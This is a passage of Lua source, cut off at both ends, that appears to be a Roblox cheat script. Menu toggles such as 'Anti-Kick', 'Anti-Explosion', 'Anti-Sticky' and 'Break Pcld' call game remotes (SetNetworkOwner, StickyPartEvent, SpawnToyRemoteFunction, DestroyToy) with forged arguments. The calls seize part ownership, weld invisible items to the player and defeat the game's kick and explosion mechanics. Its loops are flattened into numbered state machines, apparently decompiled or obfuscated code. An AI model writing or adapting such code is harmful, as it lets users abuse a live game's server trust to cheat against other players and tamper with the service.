                        if arg then
                            enabled = false
                        else
                            enabled = true
                        end

                        clientExoplosionHandler.Enabled = enabled
                    end
                end
            end,
        })

        v14:AddToggle("Antiexe", {
            Text = "Anti-Explosion",
            Default = false,
            Callback = function(antiExplosionActive)
                tbl2.AntiExplosionActive = antiExplosionActive

                if antiExplosionActive then
                    if tbl2.AntiExplosionConnection then
                        tbl2.AntiExplosionConnection:Disconnect()
                        tbl2.AntiExplosionConnection = nil
                    end

                    local v46 = getCharacter()
                    if not v46 then
                        return
                    end
                    local humanoidRootPart = v46:WaitForChild("HumanoidRootPart")

                    tbl2.AntiExplosionConnection = workspace.ChildAdded:Connect(function(child)
                        if child.Name == "Part" and tbl2.AntiExplosionActive and (child.Position - humanoidRootPart.Position).Magnitude <= 20 then
                            humanoidRootPart.Anchored = true
                            task.wait(0.01)
                            local rightArm = v46:FindFirstChild("Right Arm")

                            if rightArm then
                                local ragdollLimbPart = rightArm:FindFirstChild("RagdollLimbPart")

                                if ragdollLimbPart then
                                    while ragdollLimbPart.CanCollide and tbl2.AntiExplosionActive do
                                        task.wait(0.001)
                                    end
                                end
                            end

                            if tbl2.AntiExplosionActive then
                                humanoidRootPart.Anchored = false
                            end
                        end
                    end)
                else
                    if tbl2.AntiExplosionConnection then
                        tbl2.AntiExplosionConnection:Disconnect()
                        tbl2.AntiExplosionConnection = nil
                    end

                    local v46 = getCharacter()

                    if v46 then
                        local humanoidRootPart = v46:FindFirstChild("HumanoidRootPart")

                        if humanoidRootPart then
                            humanoidRootPart.Anchored = false
                        end
                    end
                end
            end,
        })

        v14:AddToggle("Antistickey", {
            Text = "Anti-Sticky",
            Default = false,
            Callback = function(antiStickyToggle)
                tbl2.antiStickyToggle = antiStickyToggle

                if StickyPartsTouchDetection then
                    PlayerScripts.StickyPartsTouchDetection.Disabled = antiStickyToggle
                end
            end,
        })

        v16:AddToggle("BreakPCLD", {
            Text = "Break Pcld",
            Default = false,
            Callback = function(arg)
                local flag = false
                local tbl11 = {}
                tbl11[localPlayer.UserId] = true

                local function fn40(arg2)
                    if not arg2 then
                        return
                    end
                    local humanoid = arg2:WaitForChild("Humanoid", 5)
                    if not humanoid then
                        return
                    end

                    if tbl11[localPlayer.UserId] and not flag then
                        flag = true
                        humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                    else
                        flag = false
                    end
                end

                localPlayer.CharacterAdded:Connect(function(character)
                    fn40(character)
                end)

                local userId = localPlayer.UserId
                local flag2 = arg and true or nil
                tbl11[userId] = flag2

                if arg then
                    flag = false
                    local character = localPlayer.Character
                    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

                    if humanoid then
                        humanoid.Health = 0
                    end
                end
            end,
        })

        str = "SpookyCandle1"

        v16:AddDropdown("AntikickitemD", {
            Text = "anti kick item",
            Values = (function()
                local tbl11 = {}

                for k in pairs({
                    ["Japanese Lantern"] = "JapaneseLantern",
                    ["Spray Can"] = "SprayCanWD",
                    ["Spooky Candle"] = "SpookyCandle1",
                }) do
                    table.insert(tbl11, k)
                end

                table.sort(tbl11)
                return tbl11
            end)(),
            Default = "Spooky Candle",
            Callback = function(arg)
                str = ({
                    ["Japanese Lantern"] = "JapaneseLantern",
                    ["Spray Can"] = "SprayCanWD",
                    ["Spooky Candle"] = "SpookyCandle1",
                })[arg]
            end,
        })

        v16:AddToggle("Antikickitem", {
            Text = "Anti-Kick [ITEM]",
            Default = false,
            Callback = function(kickitemToggle)
                tbl2.kickitemToggle = kickitemToggle

                if kickitemToggle then
                    task.spawn(function()
                        local character, humanoidRootPart, humanoid, inPlot2, v46, antiKickItem, hitbox, v47, v48, v49, v50, v51, v52, v53, v54, v55, character2, humanoidRootPart2, kickitemPCLD, v56
                        local n2, v57, plotItems2, plots, n3, n4, v58, plotSign, thisPlotsOwners, v59, v60, v61, v62, v63, v64, v65, value, v66, connection2, now2
                        local v67, hitbox2, v68, v69, v70, v71, v72, v73, flag, partOwner_, kickitemPCLD2, firePlayerPart, n5
                        n5 = 1

                        while true do
                            if n5 == 1 then
                                if tbl2.kickitemToggle and task.wait() then
                                    n5 = 3
                                else
                                    n5 = 2
                                end
                            elseif n5 == 2 then
                                return
                            elseif n5 == 3 then
                                character = localPlayer.Character
                                humanoidRootPart = character

                                if character then
                                    n5 = 4
                                else
                                    n5 = 5
                                end
                            elseif n5 == 4 then
                                humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                                n5 = 5
                            elseif n5 == 5 then
                                humanoid = character

                                if character then
                                    n5 = 6
                                else
                                    n5 = 7
                                end
                            elseif n5 == 6 then
                                humanoid = character:FindFirstChild("Humanoid")
                                n5 = 7
                            elseif n5 == 7 then
                                inPlot2 = localPlayer:FindFirstChild("InPlot")
                                v46 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                                if humanoidRootPart and humanoid and humanoid.Health > 0 and v46 and (not inPlot2 or not inPlot2.Value) then
                                    n5 = 8
                                else
                                    n5 = 1
                                end
                            elseif n5 == 8 then
                                if not tbl2.kickitemPCLD and not tbl2.kickitemPCLDcon then
                                    n5 = 9
                                else
                                    n5 = 12
                                end
                            elseif n5 == 9 then
                                if tbl2.kickitemPCLDcon then
                                    n5 = 10
                                else
                                    n5 = 11
                                end
                            elseif n5 == 10 then
                                tbl2.kickitemPCLDcon:Disconnect()
                                n5 = 11
                            elseif n5 == 11 then
                                tbl2.kickitemPCLD = nil

                                tbl2.kickitemPCLDcon = obj.RunService.Heartbeat:Connect(function()
                                    if not tbl2.kickitemPCLD and humanoidRootPart and humanoidRootPart.Parent then
                                        for k, child in pairs(workspace:GetChildren()) do
                                            if child.Name == "PlayerCharacterLocationDetector" and child:IsA("BasePart") and (child.Position - humanoidRootPart.Position).Magnitude <= 2 then
                                                tbl2.kickitemPCLD = child
                                                break
                                            end
                                        end

                                        return
                                    end

                                    if tbl2.kickitemPCLDcon then
                                        tbl2.kickitemPCLDcon:Disconnect()
                                        tbl2.kickitemPCLDcon = nil
                                    end
                                end)

                                n5 = 12
                            elseif n5 == 12 then
                                antiKickItem = v46:FindFirstChild("AntiKickItem")
                                hitbox = antiKickItem

                                if antiKickItem then
                                    n5 = 13
                                else
                                    n5 = 14
                                end
                            elseif n5 == 13 then
                                hitbox = antiKickItem:FindFirstChild("Hitbox")
                                n5 = 14
                            elseif n5 == 14 then
                                v47 = hitbox

                                if antiKickItem and hitbox then
                                    n5 = 65
                                else
                                    n5 = 15
                                end
                            elseif n5 == 15 then
                                v48, v49, v50 = pairs(v46:GetChildren())
                                v51 = v50
                                n5 = 16
                            elseif n5 == 16 then
                                v52, v53 = v48(v49, v51)

                                if v52 == nil then
                                    n5 = 19
                                else
                                    n5 = 17
                                end
                            elseif n5 == 17 then
                                v51 = v52

                                if v53.Name == "AntiKickItem" then
                                    n5 = 18
                                else
                                    n5 = 16
                                end
                            elseif n5 == 18 then
                                pcall(function()
                                    DestroyToy:FireServer(v53)
                                end)

                                n5 = 16
                            elseif n5 == 19 then
                                v54 = str
                                v55 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                                if InPlot and InPlot.Value and InOwnedPlot and not InOwnedPlot.Value then
                                    n5 = 20
                                else
                                    n5 = 21
                                end
                            elseif n5 == 20 then
                                InPlot:GetPropertyChangedSignal("Value"):Wait()
                                n5 = 21
                            elseif n5 == 21 then
                                if CanSpawnToy and not CanSpawnToy.Value then
                                    n5 = 22
                                else
                                    n5 = 23
                                end
                            elseif n5 == 22 then
                                CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
                                n5 = 23
                            elseif n5 == 23 then
                                character2 = localPlayer.Character
                                humanoidRootPart2 = character2

                                if character2 then
                                    n5 = 24
                                else
                                    n5 = 25
                                end
                            elseif n5 == 24 then
                                humanoidRootPart2 = localPlayer.Character:FindFirstChild("HumanoidRootPart")
                                n5 = 25
                            elseif n5 == 25 then
                                if humanoidRootPart2 then
                                    n5 = 26
                                else
                                    n5 = 54
                                end
                            elseif n5 == 26 then
                                kickitemPCLD = tbl2.kickitemPCLD
                                v56 = kickitemPCLD

                                if kickitemPCLD then
                                    n5 = 28
                                else
                                    n5 = 27
                                end
                            elseif n5 == 27 then
                                v56 = humanoidRootPart2
                                n5 = 28
                            elseif n5 == 28 then
                                n2 = v56.CFrame * CFrame.new(0, 14, 20)
                                v57 = nil
                                plotItems2 = workspace:FindFirstChild("PlotItems")
                                plots = workspace:FindFirstChild("Plots")

                                if plots and plotItems2 then
                                    n5 = 29
                                else
                                    n5 = 41
                                end
                            elseif n5 == 29 then
                                n3 = 0
                                n5 = 30
                            elseif n5 == 30 then
                                n4 = n3 + 1

                                if n4 <= 5 then
                                    n5 = 31
                                else
                                    n5 = 41
                                end
                            elseif n5 == 31 then
                                n3 = n4
                                v58 = plots:FindFirstChild("Plot" .. n4)

                                if v58 then
                                    n5 = 32
                                else
                                    n5 = 40
                                end
                            elseif n5 == 32 then
                                plotSign = v58:FindFirstChild("PlotSign")
                                thisPlotsOwners = plotSign

                                if plotSign then
                                    n5 = 33
                                else
                                    n5 = 34
                                end
                            elseif n5 == 33 then
                                thisPlotsOwners = plotSign:FindFirstChild("ThisPlotsOwners")
                                n5 = 34
                            elseif n5 == 34 then
                                if thisPlotsOwners then
                                    n5 = 35
                                else
                                    n5 = 40
                                end
                            elseif n5 == 35 then
                                v59, v60, v61 = pairs(thisPlotsOwners:GetChildren())
                                v62 = v61
                                n5 = 36
                            elseif n5 == 36 then
                                v63, v64 = v59(v60, v62)

                                if v63 == nil then
                                    n5 = 39
                                else
                                    n5 = 37
                                end
                            elseif n5 == 37 then
                                v62 = v63

                                if v64.Value == localPlayer.Name then
                                    n5 = 38
                                else
                                    n5 = 36
                                end
                            elseif n5 == 38 then
                                v57 = plotItems2:FindFirstChild("Plot" .. n4)
                                n5 = 39
                            elseif n5 == 39 then
                                n3 = n4
                                n5 = 40
                            elseif n5 == 40 then
                                if v57 then
                                    n5 = 41
                                else
                                    n5 = 30
                                end
                            elseif n5 == 41 then
                                v65 = InOwnedPlot
                                value = v65

                                if v65 then
                                    n5 = 42
                                else
                                    n5 = 43
                                end
                            elseif n5 == 42 then
                                value = InOwnedPlot.Value
                                n5 = 43
                            elseif n5 == 43 then
                                if value then
                                    n5 = 44
                                else
                                    n5 = 45
                                end
                            elseif n5 == 44 then
                                value = v57
                                n5 = 45
                            elseif n5 == 45 then
                                if value then
                                    n5 = 47
                                else
                                    n5 = 46
                                end
                            elseif n5 == 46 then
                                value = v55
                                n5 = 47
                            elseif n5 == 47 then
                                if value then
                                    n5 = 48
                                else
                                    n5 = 53
                                end
                            elseif n5 == 48 then
                                v66 = nil

                                connection2 = value.ChildAdded:Connect(function(child)
                                    if child.Name == v54 then
                                        v66 = child
                                    end
                                end)

                                task.spawn(function()
                                    pcall(function()
                                        SpawnToyRemoteFunction:InvokeServer(v54, n2, Vector3.zero)
                                    end)
                                end)

                                now2 = tick()
                                n5 = 49
                            elseif n5 == 49 then
                                task.wait()

                                if not v66 and tick() - now2 <= 2.5 then
                                    n5 = 49
                                else
                                    n5 = 50
                                end
                            elseif n5 == 50 then
                                if connection2 then
                                    n5 = 51
                                else
                                    n5 = 52
                                end
                            elseif n5 == 51 then
                                connection2:Disconnect()
                                n5 = 52
                            elseif n5 == 52 then
                                v67 = v66
                                n5 = 55
                            elseif n5 == 53 then
                                v67 = nil
                                n5 = 55
                            elseif n5 == 54 then
                                v67 = nil
                                n5 = 55
                            elseif n5 == 55 then
                                if v67 then
                                    n5 = 56
                                else
                                    n5 = 1
                                end
                            elseif n5 == 56 then
                                hitbox2 = v67

                                if v67 then
                                    n5 = 57
                                else
                                    n5 = 58
                                end
                            elseif n5 == 57 then
                                hitbox2 = fn3(v67, "Hitbox", 0.5)
                                n5 = 58
                            elseif n5 == 58 then
                                v47 = hitbox2

                                if hitbox2 then
                                    n5 = 59
                                else
                                    n5 = 60
                                end
                            elseif n5 == 59 then
                                SetNetworkOwner:FireServer(v47, v47.CFrame)
                                n5 = 60
                            elseif n5 == 60 then
                                v68, v69, v70 = pairs(v67:GetChildren())
                                v71 = v70
                                n5 = 61
                            elseif n5 == 61 then
                                v72, v73 = v68(v69, v71)

                                if v72 == nil then
                                    n5 = 64
                                else
                                    n5 = 62
                                end
                            elseif n5 == 62 then
                                v71 = v72

                                if v73:IsA("BasePart") then
                                    n5 = 63
                                else
                                    n5 = 61
                                end
                            elseif n5 == 63 then
                                v73.CanCollide = false
                                v73.Transparency = 0.8
                                v73.Color = Color3.fromRGB(0, 255, 255)
                                n5 = 61
                            elseif n5 == 64 then
                                v67.Name = "AntiKickItem"
                                n5 = 65
                            elseif n5 == 65 then
                                flag = false

                                if v47 then
                                    n5 = 66
                                else
                                    n5 = 68
                                end
                            elseif n5 == 66 then
                                partOwner_ = v47:FindFirstChild("PartOwner")

                                if partOwner_ and partOwner_.Value == localPlayer.Name then
                                    n5 = 68
                                else
                                    n5 = 67
                                end
                            elseif n5 == 67 then
                                flag = true
                                n5 = 68
                            elseif n5 == 68 then
                                if v47 and flag then
                                    n5 = 69
                                else
                                    n5 = 70
                                end
                            elseif n5 == 69 then
                                fn2(v47)
                                n5 = 70
                            elseif n5 == 70 then
                                kickitemPCLD2 = tbl2.kickitemPCLD
                                firePlayerPart = kickitemPCLD2

                                if kickitemPCLD2 then
                                    n5 = 72
                                else
                                    n5 = 71
                                end
                            elseif n5 == 71 then
                                firePlayerPart = humanoidRootPart:FindFirstChild("FirePlayerPart")
                                n5 = 72
                            elseif n5 == 72 then
                                if firePlayerPart then
                                    n5 = 74
                                else
                                    n5 = 73
                                end
                            elseif n5 == 73 then
                                firePlayerPart = humanoidRootPart
                                n5 = 74
                            elseif n5 == 74 then
                                if v47 and firePlayerPart then
                                    n5 = 75
                                else
                                    n5 = 1
                                end
                            elseif n5 == 75 then
                                v47.CFrame = firePlayerPart.CFrame
                                v47.AssemblyLinearVelocity = Vector3.zero
                                v47.AssemblyAngularVelocity = Vector3.zero
                                n5 = 1
                            end
                        end
                    end)
                else
                    if tbl2.kickitemPCLDcon then
                        tbl2.kickitemPCLDcon:Disconnect()
                        tbl2.kickitemPCLDcon = nil
                    end

                    tbl2.kickitemPCLD = nil

                    task.spawn(function()
                        local v46 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                        if v46 and DestroyToy then
                            for k, child in pairs(v46:GetChildren()) do
                                if child.Name == "AntiKickItem" then
                                    pcall(function()
                                        DestroyToy:FireServer(child)
                                    end)
                                end
                            end
                        end
                    end)
                end
            end,
        })

        localPlayer.CharacterAdded:Connect(function(character)
            if tbl2.kickitemToggle then
                tbl2.kickitemPCLD = nil
                local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)

                if humanoidRootPart then
                    FindPCLD(humanoidRootPart)
                end
            end
        end)

        tbl2.AntiKickToggle = v16:AddToggle("atikikc", {
            Text = "Anti-Kick",
            Default = false,
            Callback = function(antikickT)
                tbl2.AntikickT = antikickT

                if antikickT then
                    task.spawn(function()
                        local flag, v46, v47, v48, v49, v50, v51, v52, v53, v54, plotSign, thisPlotsOwners, v55, v56, v57, v58, v59, v60, v61, v62
                        local v63, v64, ninjaShuriken, plotSign2, now2, ninjaShuriken2, v65, v66, firePlayerPart, firePlayerPart2, v67, v68, v69, v70, v71, v72, stickyPart, billboardGui, imageLabel4, now3
                        local ninjaShuriken3, v73, v74, firePlayerPart3, firePlayerPart4, v75, v76, v77, v78, v79, v80, stickyPart2, billboardGui2, imageLabel5, v81, v82, v83, v84, v85, v86
                        local v87, n2
                        n2 = 1

                        while true do
                            if n2 == 1 then
                                if tbl2.AntikickT then
                                    n2 = 2
                                else
                                    n2 = 83
                                end
                            elseif n2 == 2 then
                                task.wait(0.005)

                                if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") and localPlayer.Character.Humanoid.Health > 0 then
                                    n2 = 3
                                else
                                    n2 = 1
                                end
                            elseif n2 == 3 then
                                flag = false
                                v46 = nil

                                if obj.Workspace.PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) then
                                    n2 = 4
                                else
                                    n2 = 16
                                end
                            elseif n2 == 4 then
                                v47, v48, v49 = pairs(obj.Workspace.Plots:GetChildren())
                                v50 = v49
                                v51 = v47
                                v52 = v48
                                n2 = 5
                            elseif n2 == 5 then
                                v53, v54 = v51(v52, v50)

                                if v53 == nil then
                                    n2 = 16
                                else
                                    n2 = 6
                                end
                            elseif n2 == 6 then
                                v50 = v53
                                plotSign = v54:FindFirstChild("PlotSign")
                                thisPlotsOwners = plotSign

                                if plotSign then
                                    n2 = 7
                                else
                                    n2 = 8
                                end
                            elseif n2 == 7 then
                                thisPlotsOwners = plotSign:FindFirstChild("ThisPlotsOwners")
                                n2 = 8
                            elseif n2 == 8 then
                                if thisPlotsOwners then
                                    n2 = 9
                                else
                                    n2 = 15
                                end
                            elseif n2 == 9 then
                                v55, v56, v57 = pairs(thisPlotsOwners:GetChildren())
                                v58 = v51
                                v59 = v52
                                v60 = v57
                                n2 = 10
                            elseif n2 == 10 then
                                v61, v62 = v55(v56, v60)

                                if v61 == nil then
                                    n2 = 14
                                else
                                    n2 = 11
                                end
                            elseif n2 == 11 then
                                v60 = v61

                                if v62.Value == localPlayer.Name then
                                    n2 = 12
                                else
                                    n2 = 10
                                end
                            elseif n2 == 12 then
                                v63 = obj.Workspace.PlotItems:FindFirstChild(v54.Name)

                                if v63 then
                                    n2 = 13
                                else
                                    n2 = 10
                                end
                            elseif n2 == 13 then
                                flag = true
                                v46 = v63
                                n2 = 14
                            elseif n2 == 14 then
                                v50 = v53
                                v51 = v58
                                v52 = v59
                                n2 = 15
                            elseif n2 == 15 then
                                if flag then
                                    n2 = 16
                                else
                                    n2 = 5
                                end
                            elseif n2 == 16 then
                                v64 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                                ninjaShuriken = v64

                                if ninjaShuriken then
                                    n2 = 17
                                else
                                    n2 = 18
                                end
                            elseif n2 == 17 then
                                ninjaShuriken = v64:FindFirstChild("NinjaShuriken")
                                n2 = 18
                            elseif n2 == 18 then
                                if obj.Workspace.PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) and flag and v46 and obj.Workspace.Plots:FindFirstChild(v46.Name) then
                                    n2 = 19
                                else
                                    n2 = 44
                                end
                            elseif n2 == 19 then
                                plotSign2 = obj.Workspace.Plots[v46.Name]:FindFirstChild("PlotSign")

                                if plotSign2 and plotSign2.ThisPlotsOwners.Value.TimeRemainingNum.Value > 89 then
                                    n2 = 20
                                else
                                    n2 = 44
                                end
                            elseif n2 == 20 then
                                now2 = tick()
                                ninjaShuriken2 = nil
                                n2 = 21
                            elseif n2 == 21 then
                                if not CanSpawnToy.Value and tbl2.AntikickT and tick() - now2 <= 5 then
                                    n2 = 82
                                else
                                    n2 = 22
                                end
                            elseif n2 == 22 then
                                if CanSpawnToy.Value then
                                    n2 = 23
                                else
                                    n2 = 29
                                end
                            elseif n2 == 23 then
                                v65 = hrp_()

                                if v65 then
                                    n2 = 24
                                else
                                    n2 = 25
                                end
                            elseif n2 == 24 then
                                task.spawn(function()
                                    pcall(function()
                                        fn4("NinjaShuriken", v65.CFrame * CFrame.new(0, 12, 20), Vector3.new(0, 0, 0))
                                    end)
                                end)

                                n2 = 25
                            elseif n2 == 25 then
                                if flag and v46 then
                                    n2 = 28
                                else
                                    n2 = 26
                                end
                            elseif n2 == 26 then
                                if not obj.Workspace.PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) and v64 then
                                    n2 = 27
                                else
                                    n2 = 29
                                end
                            elseif n2 == 27 then
                                ninjaShuriken2 = v64:WaitForChild("NinjaShuriken", 2)
                                n2 = 29
                            elseif n2 == 28 then
                                ninjaShuriken2 = v46:WaitForChild("NinjaShuriken", 2)
                                n2 = 29
                            elseif n2 == 29 then
                                ninjaShuriken = ninjaShuriken2

                                if ninjaShuriken == nil then
                                    n2 = 1
                                else
                                    n2 = 30
                                end
                            elseif n2 == 30 then
                                ninjaShuriken.Name = "AntiKick"

                                if ninjaShuriken and ninjaShuriken:FindFirstChild("StickyPart") then
                                    n2 = 31
                                else
                                    n2 = 44
                                end
                            elseif n2 == 31 then
                                v66 = hrp_()

                                if v66 then
                                    n2 = 32
                                else
                                    n2 = 44
                                end
                            elseif n2 == 32 then
                                if ninjaShuriken:FindFirstChild("SoundPart") and (not ninjaShuriken.SoundPart:FindFirstChild("PartOwner") or ninjaShuriken.SoundPart.PartOwner.Value ~= localPlayer.Name) then
                                    n2 = 33
                                else
                                    n2 = 34
                                end
                            elseif n2 == 33 then
                                SetNetworkOwner:FireServer(ninjaShuriken.SoundPart, ninjaShuriken.SoundPart.CFrame)
                                n2 = 34
                            elseif n2 == 34 then
                                firePlayerPart = v66:FindFirstChild("FirePlayerPart")
                                firePlayerPart2 = firePlayerPart

                                if firePlayerPart then
                                    n2 = 36
                                else
                                    n2 = 35
                                end
                            elseif n2 == 35 then
                                firePlayerPart2 = v66:WaitForChild("FirePlayerPart", 5)
                                n2 = 36
                            elseif n2 == 36 then
                                if firePlayerPart2 then
                                    n2 = 37
                                else
                                    n2 = 38
                                end
                            elseif n2 == 37 then
                                StickyPartEvent:FireServer(ninjaShuriken.StickyPart, firePlayerPart2, CFrame.new(0, 0, 0) * CFrame.Angles(0, math.rad(90), math.rad(90)))
                                n2 = 38
                            elseif n2 == 38 then
                                v67, v68, v69 = pairs(ninjaShuriken:GetChildren())
                                v70 = v69
                                n2 = 39
                            elseif n2 == 39 then
                                v71, v72 = v67(v68, v70)

                                if v71 == nil then
                                    n2 = 42
                                else
                                    n2 = 40
                                end
                            elseif n2 == 40 then
                                v70 = v71

                                if v72:IsA("BasePart") then
                                    n2 = 41
                                else
                                    n2 = 39
                                end
                            elseif n2 == 41 then
                                v72.CanTouch = false
                                v72.CanCollide = false
                                v72.CanQuery = false
                                v72.Transparency = 1
                                n2 = 39
                            elseif n2 == 42 then
                                stickyPart = ninjaShuriken.StickyPart

                                if stickyPart and not stickyPart:FindFirstChild("KunaiPNG_GUI") then
                                    n2 = 43
                                else
                                    n2 = 44
                                end
                            elseif n2 == 43 then
                                billboardGui = Instance.new("BillboardGui")
                                billboardGui.Name = "KunaiPNG_GUI"
                                billboardGui.Adornee = stickyPart
                                billboardGui.AlwaysOnTop = true
                                billboardGui.Size = UDim2.new(1.2, 0, 1.2, 0)
                                billboardGui.DistanceUpperLimit = 1000
                                billboardGui.Parent = stickyPart
                                imageLabel4 = Instance.new("ImageLabel")
                                imageLabel4.Size = UDim2.fromScale(1, 1)
                                imageLabel4.BackgroundTransparency = 1
                                imageLabel4.Image = "rbxassetid://89062714375517"
                                imageLabel4.Parent = billboardGui
                                n2 = 44
                            elseif n2 == 44 then
                                if ninjaShuriken then
                                    n2 = 57
                                else
                                    n2 = 45
                                end
                            elseif n2 == 45 then
                                if obj.Workspace.PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) then
                                    n2 = 1
                                else
                                    n2 = 46
                                end
                            elseif n2 == 46 then
                                now3 = tick()
                                ninjaShuriken3 = nil
                                n2 = 47
                            elseif n2 == 47 then
                                if not CanSpawnToy.Value and tbl2.AntikickT and tick() - now3 <= 5 then
                                    n2 = 81
                                else
                                    n2 = 48
                                end
                            elseif n2 == 48 then
                                if CanSpawnToy.Value then
                                    n2 = 49
                                else
                                    n2 = 55
                                end
                            elseif n2 == 49 then
                                v73 = hrp_()

                                if v73 then
                                    n2 = 50
                                else
                                    n2 = 51
                                end
                            elseif n2 == 50 then
                                task.spawn(function()
                                    pcall(function()
                                        fn4("NinjaShuriken", v73.CFrame * CFrame.new(0, 12, 20), Vector3.new(0, 0, 0))
                                    end)
                                end)

                                n2 = 51
                            elseif n2 == 51 then
                                if flag and v46 then
                                    n2 = 54
                                else
                                    n2 = 52
                                end
                            elseif n2 == 52 then
                                if not obj.Workspace.PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) and v64 then
                                    n2 = 53
                                else
                                    n2 = 55
                                end
                            elseif n2 == 53 then
                                ninjaShuriken3 = v64:WaitForChild("NinjaShuriken", 2)
                                n2 = 55
                            elseif n2 == 54 then
                                ninjaShuriken3 = v46:WaitForChild("NinjaShuriken", 2)
                                n2 = 55
                            elseif n2 == 55 then
                                ninjaShuriken = ninjaShuriken3

                                if ninjaShuriken == nil then
                                    n2 = 1
                                else
                                    n2 = 56
                                end
                            elseif n2 == 56 then
                                ninjaShuriken.Name = "AntiKick"

                                if ninjaShuriken then
                                    n2 = 57
                                else
                                    n2 = 1
                                end
                            elseif n2 == 57 then
                                if ninjaShuriken and ninjaShuriken:FindFirstChild("StickyPart") and ninjaShuriken.StickyPart.CanTouch == true then
                                    n2 = 58
                                else
                                    n2 = 73
                                end
                            elseif n2 == 58 then
                                if ninjaShuriken:FindFirstChild("StickyPart") then
                                    n2 = 59
                                else
                                    n2 = 72
                                end
                            elseif n2 == 59 then
                                v74 = hrp_()

                                if v74 then
                                    n2 = 60
                                else
                                    n2 = 72
                                end
                            elseif n2 == 60 then
                                if ninjaShuriken:FindFirstChild("SoundPart") and (not ninjaShuriken.SoundPart:FindFirstChild("PartOwner") or ninjaShuriken.SoundPart.PartOwner.Value ~= localPlayer.Name) then
                                    n2 = 61
                                else
                                    n2 = 62
                                end
                            elseif n2 == 61 then
                                SetNetworkOwner:FireServer(ninjaShuriken.SoundPart, ninjaShuriken.SoundPart.CFrame)
                                n2 = 62
                            elseif n2 == 62 then
                                firePlayerPart3 = v74:FindFirstChild("FirePlayerPart")
                                firePlayerPart4 = firePlayerPart3

                                if firePlayerPart3 then
                                    n2 = 64
                                else
                                    n2 = 63
                                end
                            elseif n2 == 63 then
                                firePlayerPart4 = v74:WaitForChild("FirePlayerPart", 5)
                                n2 = 64
                            elseif n2 == 64 then
                                if firePlayerPart4 then
                                    n2 = 65
                                else
                                    n2 = 66
                                end
                            elseif n2 == 65 then
                                StickyPartEvent:FireServer(ninjaShuriken.StickyPart, firePlayerPart4, CFrame.new(0, 0, 0) * CFrame.Angles(0, math.rad(90), math.rad(90)))
                                n2 = 66
                            elseif n2 == 66 then
                                v75, v76, v77 = pairs(ninjaShuriken:GetChildren())
                                v78 = v77
                                n2 = 67
                            elseif n2 == 67 then
                                v79, v80 = v75(v76, v78)

                                if v79 == nil then
                                    n2 = 70
                                else
                                    n2 = 68
                                end
                            elseif n2 == 68 then
                                v78 = v79

                                if v80:IsA("BasePart") then
                                    n2 = 69
                                else
                                    n2 = 67
                                end
                            elseif n2 == 69 then
                                v80.CanTouch = false
                                v80.CanCollide = false
                                v80.CanQuery = false
                                v80.Transparency = 1
                                n2 = 67
                            elseif n2 == 70 then
                                stickyPart2 = ninjaShuriken.StickyPart

                                if stickyPart2 and not stickyPart2:FindFirstChild("KunaiPNG_GUI") then
                                    n2 = 71
                                else
                                    n2 = 72
                                end
                            elseif n2 == 71 then
                                billboardGui2 = Instance.new("BillboardGui")
                                billboardGui2.Name = "KunaiPNG_GUI"
                                billboardGui2.Adornee = stickyPart2
                                billboardGui2.AlwaysOnTop = true
                                billboardGui2.Size = UDim2.new(1.2, 0, 1.2, 0)
                                billboardGui2.DistanceUpperLimit = 1000
                                billboardGui2.Parent = stickyPart2
                                imageLabel5 = Instance.new("ImageLabel")
                                imageLabel5.Size = UDim2.fromScale(1, 1)
                                imageLabel5.BackgroundTransparency = 1
                                imageLabel5.Image = "rbxassetid://89062714375517"
                                imageLabel5.Parent = billboardGui2
                                n2 = 72
                            elseif n2 == 72 then
                                ninjaShuriken.Name = "AntiKick"
                                n2 = 73
                            elseif n2 == 73 then
                                task.wait(0.3)

                                if ninjaShuriken and tbl2.AntikickT and ninjaShuriken:FindFirstChild("StickyPart") and ninjaShuriken.StickyPart.CanTouch ~= false and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and ninjaShuriken:FindFirstChild("StickyPart") and (localPlayer.Character.HumanoidRootPart.Position - ninjaShuriken.StickyPart.Position).Magnitude < 20 then
                                    n2 = 57
                                else
                                    n2 = 74
                                end
                            elseif n2 == 74 then
                                if ninjaShuriken and ninjaShuriken:FindFirstChild("StickyPart") and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and (localPlayer.Character.HumanoidRootPart.Position - ninjaShuriken.StickyPart.Position).Magnitude < 20 then
                                    n2 = 80
                                else
                                    n2 = 75
                                end
                            elseif n2 == 75 then
                                v81 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                                if v81 and DestroyToy then
                                    n2 = 76
                                else
                                    n2 = 80
                                end
                            elseif n2 == 76 then
                                v82, v83, v84 = pairs(v81:GetChildren())
                                v85 = v84
                                n2 = 77
                            elseif n2 == 77 then
                                v86, v87 = v82(v83, v85)

                                if v86 == nil then
                                    n2 = 80
                                else
                                    n2 = 78
                                end
                            elseif n2 == 78 then
                                v85 = v86

                                if v87.Name ~= "AntiKick" and v87.Name ~= "NinjaShuriken" then
                                    n2 = 77
                                else
                                    n2 = 79
                                end
                            elseif n2 == 79 then
                                pcall(function()
                                    DestroyToy:FireServer(v87)
                                end)

                                n2 = 77
                            elseif n2 == 80 then
                                pcall(function()
                                    repeat
                                        task.wait(0.05)
                                    until not tbl2.AntikickT or not localPlayer.Character or not localPlayer.Character:FindFirstChild("Humanoid") or not ninjaShuriken or not ninjaShuriken:FindFirstChild("StickyPart") or not ninjaShuriken.StickyPart:FindFirstChild("StickyWeld") or not ninjaShuriken.StickyPart.StickyWeld.Part1

